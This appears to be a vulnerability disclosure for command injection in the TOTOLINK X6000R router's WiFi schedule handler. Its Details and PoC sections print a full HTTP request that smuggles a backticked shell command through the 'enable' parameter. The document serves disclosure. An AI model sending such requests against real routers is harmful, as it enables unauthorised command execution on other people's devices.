# Summary
There is a command execution vulnerability in TOTOLINK X6000R V9.4.0cu.852_B20230719(https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/247/ids/36.html).

Affected component is "/advance/wifi_schedule.html".

# Details
Web front-end interface:
![image](https://github.com/user-attachments/assets/f34fc7dd-7a08-4680-80d5-d025235197ca)

Capture the packet and see the enable parameter, and do a blind test directly:
![image](https://github.com/user-attachments/assets/29f3a1dd-c801-4918-8303-e4e62d1929a2)

```HTTP
POST /cgi-bin/cstecgi.cgi?token=B5904DB48F93AAA0 HTTP/1.1
Host: ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 106
Origin: http://ip:8081
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://ip:8081/advance/wifi_schedule.html?token=B5904DB48F93AAA0
Priority: u=1

{"wifiIdx":"0","enable":"`ls / >/web/poc_wifischedule.txt`","isGuest":"0","topicurl":"setWiFiScheduleCfg"}
```
![image](https://github.com/user-attachments/assets/0e8790ca-e0d9-44d1-a671-9687a92d29a9)

![image](https://github.com/user-attachments/assets/7998b9ff-0cf3-4021-97c3-729992bad554)


# PoC
Capture the packet and see the enable parameter, and do a blind test directly:
```HTTP
POST /cgi-bin/cstecgi.cgi?token=B5904DB48F93AAA0 HTTP/1.1
Host: ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 106
Origin: http://ip:8081
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://ip:8081/advance/wifi_schedule.html?token=B5904DB48F93AAA0
Priority: u=1

{"wifiIdx":"0","enable":"`ls / >/web/poc_wifischedule.txt`","isGuest":"0","topicurl":"setWiFiScheduleCfg"}
```
![image](https://github.com/user-attachments/assets/0e8790ca-e0d9-44d1-a671-9687a92d29a9)

![image](https://github.com/user-attachments/assets/7998b9ff-0cf3-4021-97c3-729992bad554)
